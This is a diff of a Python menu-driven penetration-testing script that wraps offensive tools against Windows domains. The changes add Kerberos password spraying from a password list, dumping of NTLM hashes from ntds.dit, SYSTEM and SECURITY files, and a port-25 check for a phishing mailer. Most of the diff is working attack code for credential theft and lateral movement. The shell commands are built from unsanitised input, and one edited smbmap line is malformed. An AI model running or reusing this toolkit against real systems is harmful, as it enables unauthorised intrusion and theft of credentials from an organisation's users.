@@ -53,6 +53,7 @@ colour4 = "red"
 colour5 = "blue"
 network = "tun0"
 workdir = "MASTER"
+splashs = 1
 bughunt = 0
 
 # -------------------------------------------------------------------------------------
@@ -318,11 +319,11 @@ def options():
    print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set WORK AREA   (22) Service (32) Lookup Sids    (42) KerbBruteForce (52) BloodHound  (62) GenListPASS (72) MSF Tomcat (82) SSH ID  " + '\u2551')
    print('\u2551' + "(3) Re/Set LIVE PORTS  (13) Check Connection   (23) AtExec  (33) SamDump Users  (43) KerbRoasting   (53) BH ACLPwn   (63) Editor USER (73) RemoteSync (83) Telnet  " + '\u2551')
    print('\u2551' + "(4) Re/Set WEB ADDRESS (14) Recon DNS SERVER   (24) DcomExe (34) REGistryValues (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) RSyncDumpS (84) NetCat  " + '\u2551')
-   print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Dump       (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HOST (75) GoPhishing (85) SQSH    " + '\u2551')
-   print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Rpc Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor DNS  (76) Nikto Scan (86) MSSQL   " + '\u2551')
-   print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) Smb Client     (47) PasstheTicket  (57) SmbExecHASH (67) Hydra FTP   (77) GoBuster   (87) MySQL   " + '\u2551')
+   print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Dump       (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HASH (75) Nikto Scan (85) SQSH    " + '\u2551')
+   print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Rpc Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor HOST (76) GoBuster   (86) MSSQL   " + '\u2551')
+   print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) Smb Client     (47) PasstheTicket  (57) SmbExecHASH (67) Hydra FTP   (77) GoPhishing (87) MySQL   " + '\u2551')
    print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbMap SHARE   (48) Silver Ticket  (58) WmiExecHASH (68) Hydra SSH   (78) RDeskTop   (88) WinRm   " + '\u2551')
-   print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMAP SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) GPP Decrypt (69) Hydra SMB   (79) XDesktop   (89) Exit    " + '\u2551')
+   print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMAP SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Hydra SMB   (79) XDesktop   (89) Exit    " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
@@ -351,7 +352,7 @@ print("               BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)      
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-print("\n[*] Booting - Please wait...\n")
+print("\n[*] Booting - Please wait...")
 print("[+] Local host set to " + localip + "...")
 if not os.path.exists(workdir):
    os.mkdir(workdir)
@@ -387,9 +388,9 @@ DNSC = 0		# DNS COUNTER
 COL1 = 40	 	# SESSIONS
 COL2 = 44	 	# SHARE NAMES
 COL3 = 23	 	# USER NAMES
-COL4 = 32	 	# PASSWORDS
+COL4 = 32	 	# HASHED PASSWORDS
 MAXX = 1000		# 0 - 999				# NOT LIMITED
-IP46 = " -4 "		# IP TYPE
+IP46 = "-4"		# IP TYPE
 
 SHAR = [" "*COL2]*MAXX	# SHARE NAMES
 USER = [" "*COL3]*MAXX	# USER NAMES
@@ -449,7 +450,11 @@ if DOM[:5] != "EMPTY":
    command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
    DOMC = 1
 
-time.sleep( 5 ) # Splash Screen
+if":" in TIP:
+   IP46 = "-6"
+
+if splashs == 1:
+   time.sleep( 5 )
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -484,20 +489,24 @@ while True:
          CheckParams = 1
 
       if CheckParams != 1:
-         print("[*] Attempting to enumerate domain name...")
          command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
-
          line1 = linecache.getline("lsaquery.tmp", 1)
+         
          if (line1[:6] == "Cannot") or (line1[:1] == "") or "ACCESS_DENIED" in line1:
             print(colored("[!] WARNING!!! - Unable to connect to RPC data...",'red'))
+            CheckParams = 1
          else:
-            DOM = " "*COL1					# WE HAVE CONNECTION SO
-            SID = " "*COL1					# WIPE CLEAN CURRENT VALUES
-            try:
-               null,DOM = line1.split(":")
-            except ValueError:
-               DOM = "EMPTY"
-                  
+            print("[*] Attempting to enumerate domain name...")
+            
+      if CheckParams != 1:
+         DOM = " "*COL1					# WE HAVE CONNECTION SO
+         SID = " "*COL1					# WIPE CLEAN CURRENT VALUES
+         try:
+            null,DOM = line1.split(":")
+         except ValueError:
+            DOM = "EMPTY"
+            
+      if CheckParams != 1:                  
          DOM = DOM.strip(" ")					# CLEAN UP DATA
          if len(DOM) < COL1: DOM = padding(DOM, COL1)
                   
@@ -726,6 +735,8 @@ while True:
          for x in range(0, MAXX):
             if USER[x].rstrip(" ") == USR.rstrip(" "):
                NTM = PASS[x] # UPDATE HASH VALUE TO MATCH USER.
+               if NTM[:1] == "":
+                  NTM = "''"
                NTM = padding(NTM, COL1)
 
 # ------------------------------------------------------------------------------------- 
@@ -963,7 +974,7 @@ while True:
             print("[-] Unable to enumerate any port information, good luck!!...")
          else:
             print("[+] Found live ports...\n")
-            print(colored(POR,colour2))         
+            print(colored(POR,colour2))
         
          prompt()
       
@@ -1501,9 +1512,9 @@ while True:
       if CheckParams != 1:
          command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > SHARES.tmp")
          
-         command("tput setaf 2; tput bold")
+         command("tput setaf 2")
          command("cat SHARES.tmp")
-         command("tput sgr0; tput dim")
+         command("tput sgr0")
          
          command("sed -i /Sharename/d SHARES.tmp")		# TIDY UP THE FILE READY FOR READING
          command("sed -i /-/d         SHARES.tmp")
@@ -1537,15 +1548,19 @@ while True:
       CheckParams = 0
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if ":" in TIP.rstrip(" "):
+         print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
          CheckParams = 1
       
       if CheckParams != 1:
          if DOM[:5] == "EMPTY":
             print("")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + " -R")
          else:
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + "R")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1662,9 +1677,9 @@ while True:
       if CheckParams != 1:
          found = 0
          print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.txt")
+         command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.tmp")
 
-         test1 = linecache.getline("bpassword1.txt", 1)
+         test1 = linecache.getline("bpassword1.tmp", 1)
          test1 = test1.rstrip("\n")
          if test1 != "":
             found = 1
@@ -1674,9 +1689,9 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying all usernames with matching passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.txt")
+            command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.tmp")
          
-         test2 = linecache.getline("bpassword2.txt", 1)
+         test2 = linecache.getline("bpassword2.tmp", 1)
          test2 = test2.rstrip("\n")
          if test2 != "":
             found = 1
@@ -1685,29 +1700,20 @@ while True:
             if len(PAS) < COL1: PAS = padding(PAS, COL1)
 
          if found == 0:
-            print("\n[*] Now trying user Administrator with random passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword3.txt")
-    
-         test3 = linecache.getline("bpassword3.txt", 1)
-         test3 = test3.rstrip("\n")
-         if test3 != "":
-            found = 1
-            USR,PAS = test3.split(":")        
-            if len(USR) < COL1: USR = padding(USR, COL1)
-            if len(PAS) < COL1: PAS = padding(PAS, COL1)
-
-         if found == 0:
-            print("\n[*] Now trying all users with random passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword4.txt")
-     
-         test4 = linecache.getline("bpassword4.txt", 1)
-         test4 = test4.rstrip("\n")
-         if test4 != "":
-            USR,PAS = test4.split(":") 
-            if len(USR) < COL1: USR = padding(USR, COL1)
-            if len(PAS) < COL1: PAS = padding(PAS, COL1)
-
-         command("rm bpassword*.txt")
+            print("\n[*] Now trying all users with random passwords, please wait as this could take sometime...")
+            
+            with open("passwords.txt","r") as read:
+               for line in read:
+                  line = line.rstrip("\n")
+                  command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + line + " -outputfile bpassword3.tmp > log.tmp") 
+                  
+                  test3 = linecache.getline("bpassword3.tmp", 1)
+                  test3 = test3.rstrip("\n")                                    
+                                    
+                  if test3 != "":
+                     USRX,PASX = test3.split(":") 
+                     print("[+] User " + USRX + " has associated password " + PASX + "...")
+                     os.remove("bpassword3.tmp")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2208,14 +2214,49 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - gpp AES256 Cracker
+# Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='59':
-      AES256 = input("[*] Please enter the AES-256 Encryption: ")
-      if AES256 != "":
-         command("gpp-decrypt " + AES256)
+      CheckParams = 0
+      
+      print("[*] Checking work folder for relevant files...")
+
+      if os.path.exists("./" + DIR.rstrip(" ") + "/ntds.dit"):
+         print("[+] File ntds.dit found...")
+      else:
+         print("[-] File ntds.dit not found...")
+         CheckParams = 1
+         
+      if os.path.exists("./" + DIR.rstrip(" ") + "/SYSTEM"):
+         print("[+] File SYSTEM found...")
+      else:
+         print("[-] File SYSTEM not found...")
+         CheckParams = 1         
+
+      if os.path.exists("./" + DIR.rstrip(" ") + "/SECURITY"):
+         print("[+] File SECURITY found...")
+      else:
+         print("[-] File SECURITY not found")
+         CheckParams = 1       
+         
+      if CheckParams != 1:
+         print("[*] Revealing secrets, please wait...")
+         command(PATH + "secretsdump.py -ntds ./" + DIR.rstrip(" ") + "/ntds.dit -system ./" + DIR.rstrip(" ") +  "/SYSTEM -security ./" + DIR.rstrip(" ") + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + DIR.rstrip(" ") +  "/ntlm-extract > log.tmp")
+         
+         print("[*] Extracting the data...")
+         command("cut -f1 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > usernames.txt")
+         command("cut -f4 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > hashes.txt")
+         
+         for x in range (0, MAXX):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+            USER[x] = padding(USER[x], COL3)
+         
+         for x in range (0, MAXX):
+            PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
+            PASS[x] = padding(PASS[x], COL4)
+             
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2324,7 +2365,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Nano passwords.txt
+# Details : Menu option selected - Nano passwords.txt DEFUNK??????
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2336,24 +2377,29 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Editor  hosts
+# Details : Menu option selected - Editor  hashes.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='65':
-      command("nano /etc/hosts")
+      command("nano hashes.txt")
+           
+      for x in range (0, MAXX):
+            PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
+            PASS[x] = padding(PASS[x], COL4)
+            
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Editor resolv.conf
+# Details : Menu option selected - Editor hosts.conf
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='66':
-      command("nano /etc/resolv.conf")
+      command("nano /etc/hosts")
       prompt()
             
 # ------------------------------------------------------------------------------------- 
@@ -2625,6 +2671,54 @@ while True:
    if selection =='74':
       command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
       prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - Nikto
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='75':
+      CheckParams = 0
+      
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         CheckParams = 1
+         
+      if ":" in TIP:
+         print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
+         CheckParams = 1         
+         
+      if CheckParams != 1:
+         if WEB[:5] != "EMPTY":
+            command("nikto -h " + WEB.rstrip(" "))
+         else:
+            command("nikto -h " + TIP.rstrip(" "))
+      prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Pr0J3CT_M@k30V3r                                                               
+# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
+# Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='76':
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+      else:
+         if WEB[:5] == "EMPTY":
+            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
+         else:
+            if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
+               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50 -k") 
+            else: 
+               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2634,7 +2728,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='75':
+   if selection =='77':
       CheckParams = 0   
 
       if TIP[:5] == "EMPTY":
@@ -2643,6 +2737,10 @@ while True:
          
       if DOM[:5] == "EMPTY":
          print("[-] Remote mail.server has not been specified...")
+         CheckParams = 1
+      
+      if "25" not in POR:
+         print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour4))
          CheckParams = 1
          
       if CheckParams != 1:
@@ -2708,46 +2806,6 @@ while True:
                   print("[+] Mail sent to " + phish + "...")
          else:
             print("[-] No valid email addresses where found...")
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Nikto
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='76':
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-      else:
-         if WEB[:5] != "EMPTY":
-            command("nikto -h " + WEB.rstrip(" "))
-         else:
-            command("nikto -h " + TIP.rstrip(" "))
-      prompt()  
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
-# Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='77':
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-      else:
-         if WEB[:5] == "EMPTY":
-            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
-         else:
-            if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
-               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50 -k") 
-            else: 
-               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
